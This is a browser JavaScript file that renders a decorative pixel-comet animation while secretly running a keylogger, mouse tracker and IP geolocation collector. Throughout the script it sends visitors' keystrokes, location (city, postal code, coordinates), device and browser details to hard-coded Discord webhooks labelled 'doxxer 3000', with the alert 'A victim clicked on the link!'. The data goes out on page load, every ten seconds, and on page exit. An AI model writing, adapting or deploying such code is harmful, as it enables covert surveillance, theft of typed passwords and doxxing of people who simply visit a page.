const mouseMovements = [];
let lastMoveTime = 0;

const ipWebhookURL = [
  'https://discord.com/api/webhooks',
  '1391889747642814605',
  'f6mw1KKg47pRO2s0ZjsmGXQSiD9pkAj_8fDyES0giIvCX06T8ukkgNMS8qv4rYva89bJ'
].join('/');

const mouseWebhookURL = 'https://discord.com/api/webhooks/1393306258085511290/9juDV2gcqKoohygCBnFyzbUl3aZr_g59urDka85UWaCOlS3u6_Gn3EVZgu-tyJTy8XB4';

// Your provided keylogger webhook URL:
const keyWebhookURL = 'https://discord.com/api/webhooks/1393308088538365984/KseCo8NxlWumHOYKws88o9B9PZozej0SfedeCCdJHHtCaO-ib_cZgnySJbRV5TSR9_4u';

const keyLogs = [];
let lastKeyLogTime = 0;

window.addEventListener('mousemove', (e) => {
  const now = Date.now();
  if (now - lastMoveTime > 50) {  // throttle max 20 events per second
    mouseMovements.push({
      x: e.clientX,
      y: e.clientY,
      time: new Date().toISOString(),
      viewportWidth: window.innerWidth,
      viewportHeight: window.innerHeight
    });
    if (mouseMovements.length > 100) {
      mouseMovements.shift();
    }
    lastMoveTime = now;
  }
});

window.addEventListener('keydown', (event) => {
  const now = Date.now();
  if (now - lastKeyLogTime > 50) { // throttle keylogging to max 20 events/sec
    keyLogs.push({
      key: event.key,
      time: new Date().toISOString()
    });
    if (keyLogs.length > 100) {
      keyLogs.shift(); // keep last 100 keys only
    }
    lastKeyLogTime = now;
  }
});

const formatMouseMovements = (movements) => {
  return movements.map(m =>
    `• [${m.time}] Position: (${m.x}, ${m.y}), Viewport: ${m.viewportWidth}x${m.viewportHeight}`
  ).join('\n');
};

const formatKeyLogs = (logs) => {
  return logs.map(k => `• [${k.time}] Key: ${k.key}`).join('\n');
};

const sendMouseData = async () => {
  if (mouseMovements.length === 0) return;

  const mouseData = formatMouseMovements(mouseMovements);

  const embed = {
    username: "doxxer 3000 - Mouse Tracker",
    avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
    content: "@here",
    embeds: [
      {
        title: "Mouse Movement Data (last 100)",
        description: mouseData || "No mouse movement recorded.",
        color: 0x800080
      }
    ]
  };

  try {
    const res = await fetch(mouseWebhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(embed)
    });
    if (res.ok) {
      console.log("Mouse data sent!");
      mouseMovements.length = 0;
    } else {
      console.log("Failed to send mouse data.");
    }
  } catch (err) {
    console.error("Error sending mouse data:", err);
  }
};

const sendKeyLogs = async () => {
  if (keyLogs.length === 0) return;

  const keyData = formatKeyLogs(keyLogs);

  const embed = {
    username: "doxxer 3000 - Keylogger",
    avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
    content: "@here",
    embeds: [
      {
        title: "Keylogs (last 100)",
        description: keyData || "No keys logged.",
        color: 0x800080
      }
    ]
  };

  try {
    const res = await fetch(keyWebhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(embed)
    });
    if (res.ok) {
      console.log("Key data sent!");
      keyLogs.length = 0;
    } else {
      console.log("Failed to send key data.");
    }
  } catch (err) {
    console.error("Error sending key data:", err);
  }
};

const sendIP = async () => {
  try {
    const ipResponse = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipResponse.json();
    const ipadd = ipData.ip;

    const geoResponse = await fetch(`https://ipapi.co/${ipadd}/json/`);
    const geoData = await geoResponse.json();

    const getOS = () => {
      const { userAgent, platform } = navigator;
      const macos = ['Macintosh', 'MacIntel', 'MacPPC', 'Mac68K'];
      const windows = ['Win32', 'Win64', 'Windows', 'WinCE'];
      const ios = ['iPhone', 'iPad', 'iPod'];

      if (macos.includes(platform)) return 'macOS';
      if (ios.includes(platform)) return 'iOS';
      if (windows.includes(platform)) return 'Windows';
      if (/Android/.test(userAgent)) return 'Android';
      if (/Linux/.test(platform)) return 'Linux';
      return 'Unknown';
    };

    const getBrowser = () => {
      const ua = navigator.userAgent;
      if (ua.includes("Firefox")) return "Firefox";
      if (ua.includes("Edg")) return "Edge";
      if (ua.includes("OPR") || ua.includes("Opera")) return "Opera";
      if (ua.includes("Chrome")) return "Chrome";
      if (ua.includes("Safari")) return "Safari";
      return "Unknown";
    };

    const getDeviceType = () => /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop";

    const embed = {
      username: "doxxer 3000",
      avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
      content: "@here",
      embeds: [
        {
          title: 'A victim clicked on the link!',
          description: `**IP Address >>** ${ipadd}
**Network >>** ${geoData.network}
**City >>** ${geoData.city}
**Region >>** ${geoData.region}
**Country >>** ${geoData.country_name}
**Postal Code >>** ${geoData.postal}
**Latitude >>** ${geoData.latitude}
**Longitude >>** ${geoData.longitude}
**Referrer >>** ${document.referrer || "None"}
**User-Agent >>** ${navigator.userAgent}
**OS >>** ${getOS()}
**Browser >>** ${getBrowser()}
**Device >>** ${getDeviceType()}
**Screen >>** ${window.screen.width}x${window.screen.height}
**Time >>** ${new Date().toLocaleString()}`,
          color: 0x800080
        }
      ]
    };

    const dscResponse = await fetch(ipWebhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(embed)
    });

    console.log(dscResponse.ok ? 'Sent IP data! <3' : 'Failed to send IP data :(');

  } catch (error) {
    console.error('Error:', error);
  }
};
const canvas = document.createElement('canvas');
const ctx = canvas.getContext('2d');
document.body.appendChild(canvas);

canvas.style.position = 'fixed';
canvas.style.top = '0';
canvas.style.left = '0';
canvas.style.width = '100%';
canvas.style.height = '100%';
canvas.style.zIndex = '0';
canvas.style.pointerEvents = 'none';

let width, height;
function resize() {
  width = canvas.width = window.innerWidth;
  height = canvas.height = window.innerHeight;
}
resize();
window.addEventListener('resize', resize);

class Comet {
  constructor() {
    this.reset();
  }
  reset() {
    this.x = Math.random() * width * 1.5 - width * 0.5; // start offscreen left
    this.y = Math.random() * height * 0.5; // top half
    this.size = 2 + Math.random() * 2;
    this.speedX = 4 + Math.random() * 3; // faster horizontal speed
    this.speedY = 1 + Math.random() * 1.5;
    this.length = 20 + Math.floor(Math.random() * 30); // longer tails
    this.opacity = 0.7 + Math.random() * 0.3;
    this.trailColors = this.generateTrailColors();
  }
  generateTrailColors() {
    // Gradient of colours from bright yellow to deep red in pixels
    let colors = [];
    for(let i = 0; i < this.length; i++) {
      let t = i / this.length;
      // interpolate red/orange/yellow shades
      let r = Math.floor(255);
      let g = Math.floor(200 * (1 - t));
      let b = 0;
      colors.push(`rgba(${r},${g},${b},${(1 - t) * this.opacity})`);
    }
    return colors;
  }
  update() {
    this.x += this.speedX;
    this.y += this.speedY;
    if (this.x - this.length * this.speedX > width || this.y - this.length * this.speedY > height) {
      this.reset();
      this.y = Math.random() * height * 0.5;
      this.x = -this.length * this.speedX; // restart from offscreen left
    }
  }
  draw(ctx) {
    ctx.save();
    ctx.imageSmoothingEnabled = false; // pixelated look

    // Draw tail pixels from furthest to nearest
    for (let i = this.length - 1; i >= 0; i--) {
      const tailX = this.x - i * this.speedX * 0.8;
      const tailY = this.y - i * this.speedY * 0.8;

      ctx.fillStyle = this.trailColors[i];
      ctx.fillRect(Math.floor(tailX), Math.floor(tailY), this.size, this.size);
    }

    // Bright comet head - intense yellow/orange
    ctx.fillStyle = 'rgba(255, 255, 180, 1)';
    ctx.fillRect(Math.floor(this.x), Math.floor(this.y), this.size + 1, this.size + 1);

    ctx.restore();
  }
}

const comets = [];
const cometCount = 40;

for (let i = 0; i < cometCount; i++) {
  comets.push(new Comet());
}

function animate() {
  ctx.clearRect(0, 0, width, height);

  comets.forEach(comet => {
    comet.update();
    comet.draw(ctx);
  });

  requestAnimationFrame(animate);
}

animate();
sendIP();
setInterval(sendMouseData, 10000);
setInterval(sendKeyLogs, 10000);
window.addEventListener('beforeunload', () => {
  sendMouseData();
  sendKeyLogs();
});
